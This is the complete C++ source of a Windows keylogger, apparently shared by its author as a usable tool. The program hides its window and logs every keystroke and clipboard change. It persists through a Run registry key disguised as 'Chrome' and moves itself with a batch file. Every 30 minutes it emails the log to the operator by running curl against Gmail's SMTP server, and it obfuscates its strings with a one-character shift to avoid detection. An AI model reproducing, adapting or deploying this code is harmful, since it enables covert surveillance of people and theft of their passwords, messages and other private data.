#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <fstream>
#include <ctime>
#include <Lmcons.h>
#include <iostream> 

#pragma warning(disable : 4996)
using namespace std; //I have in my habit using that


//U should enable less secure apps if u use gmail, https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg
//ATTENTION, ACHTUNG, UWAGA, ВНИМАНИЕ U HAVE TO ENCRYPT STRINGS ELSE KEYLOGGER WON'T WORK, U CAN FIND ENCRYPTION TOOL IN MY REPOSITORY//vende11s
const string exe_name = "lfzmphhfs/fyf"; //Make sure its same as name of your file, else autostart and autoinstall 
const string LogFileName = "ebub/ui";
const string EmailFrom = "fybnqmfAhnbjm/dpn";
const string EmailFromPassword = "ZpvsQbttpxse";
const string EmailTo = "fybnqmfAhnbjm/dpn";
const bool IsWindowHidden = true;
const bool LogClipboard = true;
const bool RemoveLogsAfterSend = true; //It will remove Logs ONLY when sending log will be sucessfully
const float FrequencyOfSendingLogs = 30; //In Minutes


string decrypt(string text) {
	int len = text.length();
	for (int i = 0; i < len; i++)
	{
		text[i]--;
	}
	cout << text;
	return text;
}

int send() {
	string cmd = decrypt("dvsm!tnuq;00tnuq/hnbjm/dpn;698!..ttm.sfre!.w!..nbjm.gspn!]#" + EmailFrom + "#]!..nbjm.sdqu!]#" + EmailTo + "#]!..ttm!..vqmpbe.gjmf!&ufnq&]#" + LogFileName + "!.v!" + EmailFrom + ";" + EmailFromPassword + "!.l!..bozbvui");
	int info = system(cmd.c_str());
	return info;
}
inline bool filexits(const string& name) {
	struct stat buffer;
	return (stat(name.c_str(), &buffer) == 0);
}
string GetDirectory() {
	string cmd3;
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);

	char letter[UNLEN + 1];
	GetSystemDirectory(letter, sizeof(letter));

	cmd3 = letter[0];
	cmd3 += decrypt(";]Vtfst]") + (string)username + decrypt("]BqqEbub]Mpdbm]Ufnq]");

	return cmd3;
}
void autostart() {
	string cmd = GetDirectory();
	cmd += decrypt(exe_name);
	if (!filexits(cmd.c_str())) {

		string cmd2 = decrypt("Sfh!Bee!ILFZ`DVSSFOU`VTFS]Tpguxbsf]Njdsptpgu]Xjoepxt]DvssfouWfstjpo]Svo!0w!Dispnf!0u!SFH`T[!0e") + cmd;

		system(cmd2.c_str());

		fstream file;
		file.open(decrypt("ufnq/cbu"), ios::out);
		file << decrypt("ubtlljmm!0JN!" + exe_name) + " /F"
			<< "\nmove " + decrypt(exe_name + "!&ufnq&")+"\n"
			<< decrypt("tubsu!!&ufnq&]" + exe_name)
			<< "\n"+decrypt("efm!ufnq/cbu")
			<< "\nexit";

		file.close();
		system(decrypt("tubsu!ufnq/cbu").c_str());

	}
}


void LOG(string input, bool decrypt_ = true) {
	fstream LogFile;
	LogFile.open(decrypt(LogFileName), fstream::app);
	if (LogFile.is_open()) {
		if(decrypt_)
		LogFile << decrypt(input);
		else LogFile << input;
		LogFile.close();
	}
}

//special chars
bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		LOG("!$TQBDF$!");
		return true;
	case VK_RETURN:
	{
		LOG("\n", false);
		LOG("!$FOUFS$!");
		return true;
	}
	case '.':
		LOG("/");
		return true;
	case VK_SHIFT:
		LOG("!$TIJGU$!");
		return true;
	case VK_BACK:
		LOG("!$CBDLTQBDF$!");
		return true;
	case VK_RBUTTON:
		LOG("!$S`DMJDL$!");
		return true;
	case VK_CAPITAL:
		LOG("!$DBQT`MPDL$!");
		return true;
	case VK_TAB:
		LOG("!$UBC$!");
		return true;
	case VK_UP:
		LOG("!$VQ`BSSPX$!");
		return true;
	case VK_DOWN:
		LOG("!$EPXO`BSSPX$!");
		return true;
	case VK_LEFT:
		LOG("!$MFGU`BSSPX$!");
		return true;
	case VK_RIGHT:
		LOG("!$SJHIU`BSSPX$!");
		return true;
	case VK_CONTROL:
		LOG("!$DPOUSPM`BSSPX$!");
		return true;
	case VK_MENU:
		LOG("!$BMU$!");
		return true;
	default:
		return false;
	}
}

HANDLE clip = 0;
char* buff;
string buffstr = "";
void ClipBoard() {

	OpenClipboard(NULL);

	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		clip = GetClipboardData(CF_TEXT);
	}
	else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
	{
		clip = GetClipboardData(CF_UNICODETEXT);
	}
	CloseClipboard();
	buff = (char*)clip;
	if (buff != buffstr) {
		cout << buff << endl;
		buffstr = buff;
		LOG("!$DMJQCPBSE$?!");
		LOG(buffstr,0);
		LOG("!=$DMJQCPBSE$!");
	}
}

int main()
{
	if (IsWindowHidden) ShowWindow(GetConsoleWindow(), SW_HIDE);
	fstream LogFile;
	//To make sure  LogFile is created
	LogFile.open(GetDirectory() + decrypt(LogFileName), ios::out);
	LogFile.close();
	//Sleep because pc after boot can haven't connected to internet yet
	Sleep(500);

	autostart();

	char KEY = 'x';
	bool IsOnlyOneTime = true;

	time_t t;
	struct tm* tt;
	time(&t);
	tt = localtime(&t);

	//Log at start of program
	LogFile.open(decrypt(LogFileName), fstream::app);
	LogFile << endl << "###" << asctime(tt);
	LogFile.close();
	send();

	time_t one = clock();

	while (true) {
		time_t two = clock();
		double time1 = (double)(two - one) / CLOCKS_PER_SEC;
		if (time1 / 60 >= FrequencyOfSendingLogs)
		{
			one = clock();
			time(&t);
			tt = localtime(&t);
			LogFile.open(decrypt(LogFileName), fstream::app);
			LogFile << endl << "#|#" << asctime(tt);
			LogFile.close();

			int info = send();
			if (RemoveLogsAfterSend && info == 0)
				remove(decrypt(LogFileName).c_str());
		}

		//Log Clipboard
		if (LogClipboard) ClipBoard();
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			// Logging chars
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {
					LogFile.open(decrypt(LogFileName), fstream::app);
					LogFile << char(KEY);
					LogFile.close();
				}
			}
		}
	}
}
